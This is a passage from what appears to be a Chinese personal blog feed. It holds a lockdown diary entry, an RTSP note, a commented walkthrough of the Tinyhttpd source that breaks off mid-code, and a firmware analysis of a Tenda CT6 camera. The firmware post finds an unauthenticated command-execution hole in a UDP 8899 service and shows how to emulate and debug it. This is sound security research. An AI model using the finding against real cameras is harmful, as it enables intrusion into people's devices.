src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=xwdABscHQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=69e5ae34acdd4cc32acfe11ad63264b2&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p>哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。</p><hr><p>哎呀终于解封了</p><p>属实是封了快一个月</p><p>让我来显摆一下封控时候搞得能吃的哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134775.jpeg" alt="IMG_1319"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135461.jpg" alt="IMG_1333"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135009.jpg" alt="IMG_1369"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134795.jpg" alt="IMG_1396"></p><p>我觉得还可以哈哈哈</p><p>人一旦宅久了，确实容易废。</p><p>哦对，今晚有月全食，小丫头跟我说那是血月不吉利。</p><p>开玩笑，我可是唯物主义战士。</p><p>每次碎碎念都有好多骚话，却总写不出来。</p><p>算了算了无所谓的。</p><p>最后分享下最近的壁纸吧</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138298.jpg" alt="100174471_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138274.jpg" alt="100191209_p0_master1200"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138266.jpg" alt="100789898_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138336.jpg" alt="101123738_p0"></p><hr><p>好久没有碎碎念了，转眼年关降至，感觉今年啥都干了，又感觉啥都没干，人真是越来越颓了。</p><p>算了，在摸鱼，下次再说。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八的唠叨话</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tendaCT6摄像头固件分析</title>
    <link href="/article/77f90bb.html"/>
    <url>/article/77f90bb.html</url>
    
    <content type="html"><![CDATA[<p>最近逛tenda发现新上了一款摄像头，这不下载个固件看看？</p><p>直接binwalk一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271628718.png" alt="image-20220927162813264"></p><h2 id="firmAE"><a href="#firmAE" class="headerlink" title="firmAE"></a>firmAE</h2><p>这里先不看文件系统，尝试下用firmAE来模拟固件</p><blockquote><p>sudo .&#x2F;run.sh -c ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin  </p><p>需要使用root权限来执行firmAE文件夹下的run.sh，-c参数为check，来检查是否可以模拟，一般check完成后模拟起来会很快，但check很慢，ipc算是项目名字可定义即可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271737716.png" alt="image-20220927173707626"></p><blockquote><p>sudo .&#x2F;run.sh -d ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin  </p><p>check完成后可以使用 -a参数直接执行，或者-d参数以debug模式执行，debug模式</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281348543.png" alt="image-20220928134825377"></p><p>这个固件能模拟，但是不能完全模拟，知道用法就可了。</p><h2 id="如何找到一个固件的服务进行分析"><a href="#如何找到一个固件的服务进行分析" class="headerlink" title="如何找到一个固件的服务进行分析"></a>如何找到一个固件的服务进行分析</h2><p>当解包一个固件的时候发现，没有http服务，没有html页面，没有httpd，boa，uhttpd，lighttpd等。</p><p>某些摄像头经常见到这个问题。</p><p>这个时候需要从启动来一点点看找到他启动了什么服务。</p><p>当然如果有设备并且获取了串口shell，也可以直接查看</p><blockquote><p>这里推荐个超好用的命令 find </p><p>大概用法 </p><p>​    find . -name “httpd”</p><p>​     find . -name “*cfg”</p><p>支持*这样的正则匹配</p></blockquote><p>linux启动最先看inittab，一般在etc下面</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271716514.png" alt="image-20220927171626273"></p><p>启动rcS，一般都在&#x2F;etc&#x2F;init.d&#x2F;rcS</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271717140.png" alt="image-20220927171715008"></p><p>这里就是执行了init.d文件夹下的文件</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271718721.png" alt="image-20220927171849636"></p><p>S00devs 里使用mknod创建Linux中的符设备文件和块设备文件，不重要</p><p>S01udev 它主要的功能是管理&#x2F;dev目录底下的设备节点。它同时也是用来接替devfs及热插拔的功能，这意味着它要在添加&#x2F;删除硬件时处理&#x2F;dev目录以及所有用户空间的行为。也不重要</p><p>S80network中也并没有发现启动的服务</p><p>那返回到rcS，执行完S*之后，执行了&#x2F;opt&#x2F;app&#x2F;init.sh</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271734171.png" alt="image-20220927173417037"></p><p>但opt中没有任何文件，这个时候就需要上面说的find命令了。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271737692.png" alt="image-20220927173746511"></p><p>吧squashfs-root-0和-1的所有内容移动到opt下</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271740612.png" alt="image-20220927174017473"></p><p>运行network_setup.sh，启动telnet服务，将execute放到tmp，启动execute服务，运行daemon.sh</p><p>network_setup.sh中没有服务启动，不赘述</p><p>daemon.sh中执行了tdseq服务</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271747668.png" alt="image-20220927174748489"></p><p>从先后顺序来看，来分析个execute。</p><p>这里tenda摄像头设备基本都是armel，自行file即可</p><h2 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h2><p>main中可以看到socket函数（具体请看socket网络编程）</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271756484.png" alt="image-20220927175631357"></p><p>这里绑定了8899端口，但是并没有监听。启动下看看</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271804274.png" alt="image-20220927180401160"></p><p>发现8899的udp协议。</p><p>可以使用netcat连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271806829.png" alt="image-20220927180613667"></p><p>这里分析下udp协议做了什么</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271810531.png" alt="image-20220927181043433"></p><p>通过recvfrom获取到传入的内容存放到v13，创建新线程将内容传进去。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271813448.png" alt="image-20220927181335304"></p><p>在线程中，吧参数给了v9，然后注意这个v17获取了前四位做了个判断。</p><p>以为是magicnumber，满足条件执行my_system，但是这个magicnumbe没有做任何奇奇怪怪的判断。</p><p>所以可以直接命令执行，但是还是好奇这个sub_10D64做了什么。</p><p>点进去？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281140262.png" alt="image-20220928114023047"></p><p>不是，脱裤子放屁都没这么放的吧。</p><p>开发者这么做，一定有他的用(大)意(病)</p><p>查了半天，也没发现这里if分支的区别。</p><p>这里应该算是个命令执行了。直接来吧（jitang）！</p><h2 id="qemu-user导致的问题"><a href="#qemu-user导致的问题" class="headerlink" title="qemu user导致的问题"></a>qemu user导致的问题</h2><p>这里本来使用的 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;opt&#x2F;app&#x2F;execute 启动的，但是命令执行死活不成功。</p><p>gdb调试了一天，愣是没找到问题。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281154380.png" alt="image-20220928115439112"></p><p>第二天尝试了下qemu-arm-static -L . .&#x2F;opt&#x2F;app&#x2F;execute</p><p>可以了。。。，这里xxxx就是为了填充magic number，可以写脚本传入0x00来执行到sub函数。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281158099.png" alt="image-20220928115801001"></p><p>所以各位有时候遇到这种问题可以看一下是否是qemu的问题。</p><p>当然，如果像我一样，有一个同架构的其他设备，又刚好有该设备的rce，就可以搞点牛头人操作了。</p><h2 id="关于gdb多线程调试"><a href="#关于gdb多线程调试" class="headerlink" title="关于gdb多线程调试"></a>关于gdb多线程调试</h2><p>gdb多线程调试，大概说一下怎么搞。</p><p>使用qemu自带的-g参数启动远程server</p><blockquote><p> qemu-arm-static -L . -g 1234 .&#x2F;opt&#x2F;app&#x2F;execute # 1234为监听的端口</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281402057.png" alt="image-20220928140246774"></p><p>使用gdb-multiarch来进行调试</p><blockquote><p>gdb-multiarch opt&#x2F;app&#x2F;execute</p><p>target remote 127.0.0.1</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281407294.png" alt="image-20220928140716065"></p><p>在子线程函数中下个断点，我这边位置是0x000110E8</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281409052.png" alt="image-20220928140942865"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281409246.png" alt="image-20220928140953173"></p><p>使用c来执行程序</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281410262.png" alt="image-20220928141028136"></p><p>使用netcat连接udp</p><blockquote><p>nc -uvv 127.0.0.1 8899</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281411690.png" alt="image-20220928141124554"></p><p>连上后gdb中能发现新线程</p><blockquote><p>info threads</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281414198.png" alt="image-20220928141434051"></p><p>ID 2 就是断下来的心线程，使用thread 2来切换线程</p><blockquote><p>thread 2</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281415439.png" alt="image-20220928141540348"></p><p>此时pc指向我们的断点，要回主线程，只需要再次切换即可。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-rtsp</title>
    <link href="/article/ccd0d78.html"/>
    <url>/article/ccd0d78.html</url>
    
    <content type="html"><![CDATA[<p>最近在看摄像头，刚好碰到rtsp协议的东西，寻思学习记录下。</p><p>这里csdn的<a href="https://blog.csdn.net/weixin_42462202">JT同学</a>师傅的博客写的很不错。</p><p>rtsp是一个实时传输流协议，简单点说就是用来看视频的。</p><p>rtsp通常包括rtp，rtcp，rtsp</p><blockquote><p>rtsp负责客户端与服务端的请求和响应</p><p>rtcp负责在RTP传输过程中提供传输信息</p><p>rtp负责传输媒体数据</p><p>rtsp承载与rtp和rtcp之上，rtsp并不会发送媒体数据，而是使用rtp协议传输</p><p>rtp并没有规定发送方式，可以选择udp发送或者tcp发送</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220822110639937.png" alt="image-20220822110639937"></p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-tinyhttpd</title>
    <link href="/article/68d281b.html"/>
    <url>/article/68d281b.html</url>
    
    <content type="html"><![CDATA[<p>一个非常轻量的httpd服务器，只有500行代码。</p><p>我后边用python写了一个很简陋的几十行代码的，可以看下那个来简单看一下。</p><p>这里只看了网络编程的一些东西，进程通信挖个坑，下次填。</p><p>很适合</p><blockquote><p><a href="https://github.com/EZLippi/Tinyhttpd.git">https://github.com/EZLippi/Tinyhttpd.git</a></p><p>编译方式是直接make</p></blockquote><p>编译执行后发现开启4000端口</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720153445595.png" alt="image-20220720153445595"></p><p>默认加载htdocs下的index.html</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720154305858.png" alt="image-20220720154305858"></p><p>当去访问一个不存在的文件a.html</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720154327199.png" alt="image-20220720154327199"></p><p>cgi问题</p><p>这里写一个简单的shell cgi来替代自带的cgi</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-Type: text/html&quot;</span><span class="hljs-built_in">echo</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;HTML&gt;&lt;BODY&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;CENTER&gt;Today is:&lt;/CENTER&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;CENTER&gt;&lt;B&gt;&quot;</span><span class="hljs-built_in">date</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span></code></pre></div><p>访问cgi文件，发现cgi并未被执行</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720160433477.png" alt="image-20220720160433477"></p><p>是因为没有执行权限，所以导致直接被当成静态文件，而有执行权限的话，静态文件也会被当作cgi执行。</p><p>尝试将所有的文件赋予权限</p><blockquote><p>chmod 777 .&#x2F;*</p></blockquote><p>index页面无法正常显示</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720155641576.png" alt="image-20220720155641576"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720160541100.png" alt="image-20220720160541100"></p><p>执行方式可以通过下图来理解</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720152650036.png" alt="image-20220720152650036"></p><h2 id="注释代码"><a href="#注释代码" class="headerlink" title="注释代码"></a>注释代码</h2><p>项目放代码阅读时的代码放gitee了需要可自行下载：<a href="https://gitee.com/p1piyang/backward-analysis/">https://gitee.com/p1piyang/backward-analysis/</a></p><div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* J. David&#x27;s webserver */</span><span class="hljs-comment">/* This is a simple webserver.</span><span class="hljs-comment"> * Created November 1999 by J. David Blackstone.</span><span class="hljs-comment"> * CSE 4344 (Network concepts), Prof. Zeigler</span><span class="hljs-comment"> * University of Texas at Arlington</span><span class="hljs-comment"> */</span><span class="hljs-comment">/* This program compiles for Sparc Solaris 2.6.</span><span class="hljs-comment"> * To compile for Linux:</span><span class="hljs-comment"> *  1) Comment out the #include &lt;pthread.h&gt; line.</span><span class="hljs-comment"> *  2) Comment out the line that defines the variable newthread.</span><span class="hljs-comment"> *  3) Comment out the two lines that run pthread_create().</span><span class="hljs-comment"> *  4) Uncomment the line that runs accept_request().</span><span class="hljs-comment"> *  5) Remove -lsocket from the Makefile.</span><span class="hljs-comment"> */</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ISspace(x) isspace((int)(x))</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_STRING <span class="hljs-string">&quot;Server: jdbhttpd/0.1.0\r\n&quot;</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDIN   0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDOUT  1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDERR  2</span><span class="hljs-type">void</span> <span class="hljs-title function_">accept_request</span><span class="hljs-params">(<span class="hljs-type">void</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">bad_request</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">cat</span><span class="hljs-params">(<span class="hljs-type">int</span>, FILE *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">cannot_execute</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">error_die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">execute_cgi</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">int</span> <span class="hljs-title function_">get_line</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> *, <span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">headers</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">not_found</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">int</span> <span class="hljs-title function_">startup</span><span class="hljs-params">(u_short *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">unimplemented</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* A request has caused a call to accept() on the server port to</span><span class="hljs-comment"> * return.  Process the request appropriately.</span><span class="hljs-comment"> * Parameters: the socket connected to the client */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">accept_request</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;    <span class="hljs-type">int</span> client = (<span class="hljs-type">intptr_t</span>)arg;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-type">size_t</span> numchars;    <span class="hljs-type">char</span> method[<span class="hljs-number">255</span>];    <span class="hljs-type">char</span> url[<span class="hljs-number">255</span>];    <span class="hljs-type">char</span> path[<span class="hljs-number">512</span>];    <span class="hljs-type">size_t</span> i, j;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span> <span class="hljs-comment">//文件信息</span>    <span class="hljs-comment">//struct stat&#123;</span>        <span class="hljs-comment">//   dev_t     st_dev;     /* ID of device containing file */文件使用的设备号</span>        <span class="hljs-comment">//   ino_t     st_ino;     /* inode number */    索引节点号 </span>        <span class="hljs-comment">//   mode_t    st_mode;    /* protection */  文件对应的模式，文件，目录等</span>        <span class="hljs-comment">//   nlink_t   st_nlink;   /* number of hard links */    文件的硬连接数  </span>        <span class="hljs-comment">//   uid_t     st_uid;     /* user ID of owner */    所有者用户识别号</span>        <span class="hljs-comment">//   gid_t     st_gid;     /* group ID of owner */   组识别号  </span>        <span class="hljs-comment">//   dev_t     st_rdev;    /* device ID (if special file) */ 设备文件的设备号</span>        <span class="hljs-comment">//   off_t     st_size;    /* total size, in bytes */ 以字节为单位的文件容量   </span>        <span class="hljs-comment">//   blksize_t st_blksize; /* blocksize for file system I/O */ 包含该文件的磁盘块的大小   </span>        <span class="hljs-comment">//   blkcnt_t  st_blocks;  /* number of 512B blocks allocated */ 该文件所占的磁盘块  </span>        <span class="hljs-comment">//   time_t    st_atime;   /* time of last access */ 最后一次访问该文件的时间   </span>        <span class="hljs-comment">//   time_t    st_mtime;   /* time of last modification */ /最后一次修改该文件的时间   </span>        <span class="hljs-comment">//   time_t    st_ctime;   /* time of last status change */ 最后一次改变该文件状态的时间   </span>        <span class="hljs-comment">//&#125;;</span>    <span class="hljs-type">int</span> cgi = <span class="hljs-number">0</span>;      <span class="hljs-comment">/* becomes true if server decides this is a CGI</span><span class="hljs-comment">                       * program */</span>    <span class="hljs-type">char</span> *query_string = <span class="hljs-literal">NULL</span>;    <span class="hljs-comment">//读取http请求的第一行数据</span>    numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));    i = <span class="hljs-number">0</span>; j = <span class="hljs-number">0</span>;    <span class="hljs-comment">//吧请求方法存到，，method中</span>    <span class="hljs-keyword">while</span> (!ISspace(buf[i]) &amp;&amp; (i &lt; <span class="hljs-keyword">sizeof</span>(method) - <span class="hljs-number">1</span>))    &#123;        method[i] = buf[i];        i++;    &#125;    j=i;    method[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-comment">//判断如果不是get或者post方法，发送response给客户端表示无法实现</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>))    &#123;        <span class="hljs-comment">//使用sprintf函数将要返回的内容给buf,使用send函数返回给client</span>        unimplemented(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//判断为post方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>)        cgi = <span class="hljs-number">1</span>;    i = <span class="hljs-number">0</span>;    <span class="hljs-comment">//跳过空格</span>    <span class="hljs-keyword">while</span> (ISspace(buf[j]) &amp;&amp; (j &lt; numchars))        j++;    <span class="hljs-comment">//获取url</span>    <span class="hljs-keyword">while</span> (!ISspace(buf[j]) &amp;&amp; (i &lt; <span class="hljs-keyword">sizeof</span>(url) - <span class="hljs-number">1</span>) &amp;&amp; (j &lt; numchars))    &#123;        url[i] = buf[j];        i++; j++;    &#125;    url[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-comment">//get方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>)    &#123;        query_string = url;        <span class="hljs-comment">//用于记录带参数的GET方法请求中 ‘？’后的参数</span>        <span class="hljs-keyword">while</span> ((*query_string != <span class="hljs-string">&#x27;?&#x27;</span>) &amp;&amp; (*query_string != <span class="hljs-string">&#x27;\0&#x27;</span>))            query_string++;        <span class="hljs-keyword">if</span> (*query_string == <span class="hljs-string">&#x27;?&#x27;</span>)        &#123;            cgi = <span class="hljs-number">1</span>;            *query_string = <span class="hljs-string">&#x27;\0&#x27;</span>;            query_string++;        &#125;    &#125;    <span class="hljs-comment">//将htdocs与url拼接到一起给path，即我们的资源文件都在htdocs下</span>    <span class="hljs-built_in">sprintf</span>(path, <span class="hljs-string">&quot;htdocs%s&quot;</span>, url);    <span class="hljs-comment">//判断如果URL的最后一位是‘/’，加上index.html</span>    <span class="hljs-keyword">if</span> (path[<span class="hljs-built_in">strlen</span>(path) - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;/&#x27;</span>)        <span class="hljs-built_in">strcat</span>(path, <span class="hljs-string">&quot;index.html&quot;</span>);    <span class="hljs-comment">//定义函数：int stat(const char * file_name, struct stat *buf);</span>    <span class="hljs-comment">//函数说明：stat()用来将参数file_name 所指的文件状态, 复制到参数buf 所指的结构中。</span>    <span class="hljs-comment">//返回值：执行成功则返回0，失败返回-1，错误代码存于errno。 </span>    <span class="hljs-comment">//这里改了一下，把东西处理下可以看到是处理包头。</span>    <span class="hljs-comment">//根据执行来看，这个if判断</span>    <span class="hljs-keyword">if</span> (stat(path, &amp;st) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))  <span class="hljs-comment">/* read &amp; discard headers */</span>        &#123;            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));            <span class="hljs-type">char</span> *test = buf;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;for: %s&quot;</span>, test);        &#125;        <span class="hljs-comment">//打印404返回页面</span>        not_found(client);    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-comment">// 文件存在，那则跟常量S_IFMT相与，相与之后的值可以用来判断该文件是什么类型的</span>        <span class="hljs-comment">// 此处与上边判断路径是不是以 \ 结尾的地方作用一样，可以省略，留着可重复确认。</span>        <span class="hljs-keyword">if</span> ((st.st_mode &amp; S_IFMT) == S_IFDIR)            <span class="hljs-built_in">strcat</span>(path, <span class="hljs-string">&quot;/index.html&quot;</span>);        <span class="hljs-comment">//判断权限的，前面有说过的</span>        <span class="hljs-keyword">if</span> ((st.st_mode &amp; S_IXUSR) ||                (st.st_mode &amp; S_IXGRP) ||                (st.st_mode &amp; S_IXOTH)    )            cgi = <span class="hljs-number">1</span>;        <span class="hljs-keyword">if</span> (!cgi)        &#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nocgi\n&quot;</span>);            <span class="hljs-comment">//不需要cgi的</span>            serve_file(client, path);        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//需要cgi的</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cgi\n&quot;</span>);            execute_cgi(client, path, method, query_string);        &#125;    &#125;    close(client);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that a request it has made has a problem.</span><span class="hljs-comment"> * Parameters: client socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">bad_request</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 400 BAD REQUEST\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;P&gt;Your browser sent a bad request, &quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;such as a POST without a Content-Length.\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Put the entire contents of a file out on a socket.  This function</span><span class="hljs-comment"> * is named after the UNIX &quot;cat&quot; command, because it might have been</span><span class="hljs-comment"> * easier just to do something like pipe, fork, and exec(&quot;cat&quot;).</span><span class="hljs-comment"> * Parameters: the client socket descriptor</span><span class="hljs-comment"> *             FILE pointer for the file to cat */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">cat</span><span class="hljs-params">(<span class="hljs-type">int</span> client, FILE *resource)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-comment">//读取文件内容，发送到前端。</span>    fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), resource);    <span class="hljs-keyword">while</span> (!feof(resource))    &#123;        send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);        fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), resource);    &#125;&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that a CGI script could not be executed.</span><span class="hljs-comment"> * Parameter: the client socket descriptor. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">cannot_execute</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 500 Internal Server Error\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span>);    send(client, buf, <span 